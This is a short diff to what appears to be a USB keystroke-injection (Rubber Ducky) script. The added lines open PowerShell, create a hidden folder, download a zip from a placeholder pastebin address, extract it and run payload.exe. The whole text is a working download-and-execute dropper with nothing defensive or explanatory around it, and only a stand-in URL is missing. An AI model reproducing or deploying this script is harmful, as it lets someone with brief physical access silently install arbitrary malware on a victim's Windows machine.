@@ -3,3 +3,21 @@ REM Create a command line driven porgram
 GUI r 
 STRING powershell 
 ENTER
+REM Create the destination folder
+STRING [system.io.directory]::CreateDirectory("C:\voc0")
+ENTER
+REM Invoke a WebRequest and download the payload as zip
+STRING $payload = 'https://pastebin?'
+SHIFT-ENTER
+STRING $dest = 'c:\voc0\payload.zip'
+SHIFT-ENTER
+STRING Invoke-WebRequest -Uri $payload -OutFile $dest
+ENTER
+REM Extract the downloaded zip
+STRING Expand-Archive -LiteralPath 'c:\voc0\payload.zip' -DestinationPath 'c:\voc0\nzip\'
+ENTER
+REM cd to the payload dir and execute it
+STRING cd 'c:\voc0\nzip\'
+ENTER
+STRING .\payload.exe
+ENTER
